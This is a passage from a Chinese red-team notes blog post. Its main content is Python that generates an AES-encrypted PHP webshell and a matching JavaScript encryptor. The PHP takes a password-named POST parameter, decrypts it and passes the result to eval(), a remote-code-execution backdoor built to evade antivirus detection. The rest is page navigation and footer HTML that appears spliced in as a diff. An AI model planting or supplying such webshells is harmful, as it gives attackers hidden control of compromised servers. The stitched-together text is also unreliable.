generate_key(args.pwd, args.algorithm)</span><br><span class="line">    random_id = generate_random_id()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析算法位数（修复除法错误）</span></span><br><span class="line">    algo_bits = <span class="built_in">int</span>(args.algorithm.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">1</span>])  <span class="comment"># 提取128/192/256并转为整数</span></span><br><span class="line">    key_byte_length = algo_bits // <span class="number">8</span>  <span class="comment"># 计算字节长度（128/8=16）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端JavaScript脚本</span></span><br><span class="line">    frontend_content = <span class="string">f&#x27;&#x27;&#x27;/**</span></span><br><span class="line"><span class="string"> * 前端AES加密脚本（修复密钥长度）</span></span><br><span class="line"><span class="string"> * 密码：<span class="subst">&#123;args.pwd&#125;</span> | 算法：<span class="subst">&#123;args.algorithm&#125;</span></span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">&#x27;use strict&#x27;;</span></span><br><span class="line"><span class="string">const crypto = require(&#x27;crypto&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">module.exports = (pwd, data, ext = &#123;&#123;&#125;&#125;) =&gt; &#123;&#123;</span></span><br><span class="line"><span class="string">    const algorithm = &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;;</span></span><br><span class="line"><span class="string">    const salt = Buffer.from(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;, &#x27;hex&#x27;);</span></span><br><span class="line"><span class="string">    // 派生符合长度的密钥</span></span><br><span class="line"><span class="string">    const key = crypto.pbkdf2Sync(pwd, salt, 100000, <span class="subst">&#123;algo_bits / <span class="number">8</span>&#125;</span>, &#x27;sha256&#x27;);</span></span><br><span class="line"><span class="string">    const iv = crypto.randomBytes(16);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    const randomID = &quot;<span class="subst">&#123;random_id&#125;</span>&quot;;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // 加密原始payload</span></span><br><span class="line"><span class="string">    const originalPayload = data[&#x27;_&#x27;];</span></span><br><span class="line"><span class="string">    const cipherPayload = crypto.createCipheriv(algorithm, key, iv);</span></span><br><span class="line"><span class="string">    let encryptedPayload = cipherPayload.update(originalPayload, &#x27;utf8&#x27;, &#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    encryptedPayload += cipherPayload.final(&#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    data[randomID] = `$&#123;&#123;encryptedPayload&#125;&#125;|$&#123;&#123;iv.toString(&#x27;base64&#x27;)&#125;&#125;`;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // 后端执行代码</span></span><br><span class="line"><span class="string">    const execCode = `</span></span><br><span class="line"><span class="string">        $data = explode(&#x27;|&#x27;, $_POST[&#x27;<span class="subst">&#123;random_id&#125;</span>&#x27;]);</span></span><br><span class="line"><span class="string">        $encrypted = base64_decode($data[0]);</span></span><br><span class="line"><span class="string">        $iv = base64_decode($data[1]);</span></span><br><span class="line"><span class="string">        $salt = hex2bin(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">        $key = hash_pbkdf2(</span></span><br><span class="line"><span class="string">            &#x27;sha256&#x27;, </span></span><br><span class="line"><span class="string">            &#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">            $salt, </span></span><br><span class="line"><span class="string">            100000, </span></span><br><span class="line"><span class="string">            <span class="subst">&#123;key_byte_length&#125;</span>, </span></span><br><span class="line"><span class="string">            true</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string">        $decrypted = openssl_decrypt(</span></span><br><span class="line"><span class="string">            $encrypted, </span></span><br><span class="line"><span class="string">            &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">            $key, </span></span><br><span class="line"><span class="string">            OPENSSL_RAW_DATA, </span></span><br><span class="line"><span class="string">            $iv</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string">        eval($decrypted);</span></span><br><span class="line"><span class="string">    `.replace(/\s+/g, &#x27; &#x27;).trim();</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // 加密执行代码</span></span><br><span class="line"><span class="string">    const cipherPwd = crypto.createCipheriv(algorithm, key, iv);</span></span><br><span class="line"><span class="string">    let encryptedPwd = cipherPwd.update(execCode, &#x27;utf8&#x27;, &#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    encryptedPwd += cipherPwd.final(&#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    data[pwd] = `$&#123;&#123;encryptedPwd&#125;&#125;|$&#123;&#123;iv.toString(&#x27;base64&#x27;)&#125;&#125;`;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    delete data[&#x27;_&#x27;];</span></span><br><span class="line"><span class="string">    return data;</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 后端PHP脚本</span></span><br><span class="line">    backend_content = <span class="string">f&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * 后端AES解密脚本（修复密钥长度）</span></span><br><span class="line"><span class="string"> * 密码：<span class="subst">&#123;args.pwd&#125;</span> | 算法：<span class="subst">&#123;args.algorithm&#125;</span></span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$encryptedData = $_POST[&#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;] ?? &#x27;&#x27;;</span></span><br><span class="line"><span class="string">if (empty($encryptedData)) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&#x27;Missing parameter: <span class="subst">&#123;args.pwd&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">list($encryptedPwd64, $ivB64) = explode(&#x27;|&#x27;, $encryptedData, 2);</span></span><br><span class="line"><span class="string">if (empty($encryptedPwd64) || empty($ivB64)) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&quot;Parameter&#x27;s format is failed!&quot;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$encryptedPwd = base64_decode($encryptedPwd64);</span></span><br><span class="line"><span class="string">$iv = base64_decode($ivB64);</span></span><br><span class="line"><span class="string">$salt = hex2bin(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">$key = hash_pbkdf2(</span></span><br><span class="line"><span class="string">    &#x27;sha256&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">    $salt, </span></span><br><span class="line"><span class="string">    100000, </span></span><br><span class="line"><span class="string">    <span class="subst">&#123;key_byte_length&#125;</span>, </span></span><br><span class="line"><span class="string">    true</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$decryptedCode = openssl_decrypt(</span></span><br><span class="line"><span class="string">    $encryptedPwd,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;,</span></span><br><span class="line"><span class="string">    $key,</span></span><br><span class="line"><span class="string">    OPENSSL_RAW_DATA,</span></span><br><span class="line"><span class="string">    $iv</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">if ($decryptedCode === false) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&#x27;Decription is failed!&#x27;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">eval($decryptedCode);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    os.makedirs(args.output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    frontend_path = os.path.join(args.output_dir, <span class="string">&#x27;frontend_encrypt.js&#x27;</span>)</span><br><span class="line">    backend_path = os.path.join(args.output_dir, <span class="string">&#x27;backend_decrypt.php&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(frontend_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(frontend_content)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(backend_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(backend_content)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;✅ 脚本生成成功！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;前端脚本：<span class="subst">&#123;frontend_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;后端脚本：<span class="subst">&#123;backend_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;算法：<span class="subst">&#123;args.algorithm&#125;</span>（密钥长度正确）&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;AES脚本生成器（修复密钥长度问题）&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--pwd&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;同步密码（如anonymous）&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output-dir&#x27;</span>, default=<span class="string">&#x27;./generated_scripts&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;输出目录&#x27;</span>)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--algorithm&#x27;</span>, </span><br><span class="line">        default=<span class="string">&#x27;aes-256-cbc&#x27;</span>, </span><br><span class="line">        choices=[<span class="string">&#x27;aes-128-cbc&#x27;</span>, <span class="string">&#x27;aes-192-cbc&#x27;</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>],</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&#x27;AES算法（默认aes-256-cbc）&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    generate_scripts(args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
@@ -422,248 +346,4 @@
 <p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010211458999.png" alt="image-20251010211458999"></p>
 </li>
 </ol>
-
-    </div>
-
-    
-    
-    
-        
-
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>Post author:  </strong>shaoxinSEC
-  </li>
-  <li class="post-copyright-link">
-    <strong>Post link: </strong>
-    <a href="https://shaoxinsec.github.io/2025/11/04/RedteamNotes/" title="RedteamNotes">https://shaoxinsec.github.io/2025/11/04/RedteamNotes/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
-  </li>
-</ul>
-</div>
-
-
-      <footer class="post-footer">
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item"></div>
-      <div class="post-nav-item">
-    <a href="/2025/11/06/APK%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" rel="next" title="APK安全测试">
-      APK安全测试 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E6%BA%AF%E6%BA%90"><span class="nav-number">1.</span> <span class="nav-text">反溯源</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB%E6%89%93%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">WEB打点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E7%99%BB%E5%BD%95%E9%A1%B5"><span class="nav-number">2.2.</span> <span class="nav-text">爆破登录页</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-number">2.3.</span> <span class="nav-text">指纹识别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xapp"><span class="nav-number">2.3.1.</span> <span class="nav-text">xapp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#observer-ward"><span class="nav-number">2.3.2.</span> <span class="nav-text">observer_ward</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AWVS"><span class="nav-number">2.3.3.</span> <span class="nav-text">AWVS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.4.1.</span> <span class="nav-text">框架漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JAVA-Struts2"><span class="nav-number">2.4.1.1.</span> <span class="nav-text">JAVA-Struts2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JAVA-SpringBoot"><span class="nav-number">2.4.1.2.</span> <span class="nav-text">JAVA-SpringBoot</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JAVA-Jolokia"><span class="nav-number">2.4.1.3.</span> <span class="nav-text">JAVA-Jolokia</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.4.2.</span> <span class="nav-text">中间件漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.4.3.</span> <span class="nav-text">产品漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Webshell%E5%85%8D%E6%9D%80"><span class="nav-number">2.5.</span> <span class="nav-text">Webshell免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP"><span class="nav-number">2.5.1.</span> <span class="nav-text">PHP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.6.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">2.7.</span> <span class="nav-text">权限维持</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">3.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#C2"><span class="nav-number">3.1.</span> <span class="nav-text">C2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Vshell"><span class="nav-number">3.1.1.</span> <span class="nav-text">Vshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CobaltStrike"><span class="nav-number">3.1.2.</span> <span class="nav-text">CobaltStrike</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">3.2.</span> <span class="nav-text">横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-CS"><span class="nav-number">3.2.1.</span> <span class="nav-text">SMB-CS</span></a></li></ol></li></ol></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="shaoxinSEC"
-      src="/images/avatar.jpg">
-  <p class="site-author-name" itemprop="name">shaoxinSEC</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">5</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">1</span>
-        <span class="site-state-item-name">tags</span>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://gitee.com/shaoxinsec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;shaoxinsec" rel="noopener" target="_blank"><i class="fab fa-gitee fa-fw"></i>Gitee</a>
-      </span>
-  </div>
-
-
-
-      </div>
-        <div class="back-to-top motion-element">
-          <i class="fa fa-arrow-up"></i>
-          <span>0%</span>
-        </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2025</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">shaoxinSEC</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-area"></i>
-    </span>
-    <span title="Symbols count total">52k</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-    <span title="Reading time total">48 mins.</span>
-</div>
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-user"></i>
-      </span>
-      <span class="site-uv" title="Total Visitors">
-        <span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="site-pv" title="Total Views">
-        <span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
-</div>
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-  
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-</body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://shaoxinsec.github.io">shaoxinSEC</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://shaoxinsec.github.io/2025/11/04/RedteamNotes/">https://shaoxinsec.github.io/2025/11/04/RedteamNotes/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://shaoxinsec.github.io" target="_blank">少欣安全</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/11/06/APK%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" title="APK安全测试"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">APK安全测试</div></div><div class="info-2"><div class="info-item-1">   Reference：  【APK安全】APK应用安全测试策略-CSDN博客 Android APP-四大组件安全测试-先知社区 https://www.jianshu.com/p/826439b24467 Android四大组件安全漏洞实战 - 蚁景网安实验室 - 博客园   How to sniff packet? There is just a detection for client to check system cert.  Import .der from burp: bp.der  Transform .der to .pem through openssl   12openssl x509 -inform DER -in bp.der -out bp.pemopenssl x509 -subject_hash_old -in bp.pem  adb push bp.pem &#x2F;sdcard&#x2F;download  adb shell: mv &#x2F;sdcard&#x2F;Downlaod&#x2F;bp.pem &#x2F;system&...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">shaoxinSEC</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://gitee.com/shaoxinsec" target="_blank" title="Gitee"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E6%BA%AF%E6%BA%90"><span class="toc-number">1.</span> <span class="toc-text">反溯源</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">WEB打点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E7%99%BB%E5%BD%95%E9%A1%B5"><span class="toc-number">2.2.</span> <span class="toc-text">爆破登录页</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.3.</span> <span class="toc-text">指纹识别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xapp"><span class="toc-number">2.3.1.</span> <span class="toc-text">xapp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#observer-ward"><span class="toc-number">2.3.2.</span> <span class="toc-text">observer_ward</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AWVS"><span class="toc-number">2.3.3.</span> <span class="toc-text">AWVS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.1.</span> <span class="toc-text">框架漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JAVA-Struts2"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">JAVA-Struts2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JAVA-SpringBoot"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">JAVA-SpringBoot</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JAVA-Jolokia"><span class="toc-number">2.4.1.3.</span> <span class="toc-text">JAVA-Jolokia</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.2.</span> <span class="toc-text">产品漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#OpenApi"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">OpenApi</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.3.</span> <span class="toc-text">中间件漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webshell%E5%85%8D%E6%9D%80"><span class="toc-number">2.5.</span> <span class="toc-text">Webshell免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">2.5.1.</span> <span class="toc-text">PHP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">2.7.</span> <span class="toc-text">权限维持</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#C2"><span class="toc-number">3.1.</span> <span class="toc-text">C2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vshell"><span class="toc-number">3.1.1.</span> <span class="toc-text">Vshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CobaltStrike"><span class="toc-number">3.1.2.</span> <span class="toc-text">CobaltStrike</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.2.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-CS"><span class="toc-number">3.2.1.</span> <span class="toc-text">SMB-CS</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/08/RedTeamTools/" title="红队常用工具">红队常用工具</a><time datetime="2025-11-08T07:38:00.000Z" title="发表于 2025-11-08 15:38:00">2025-11-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/06/%E5%85%AB%E8%82%A1%E6%96%87/" title="红对面试八股文">红对面试八股文</a><time datetime="2025-11-06T07:37:00.000Z" title="发表于 2025-11-06 15:37:00">2025-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" 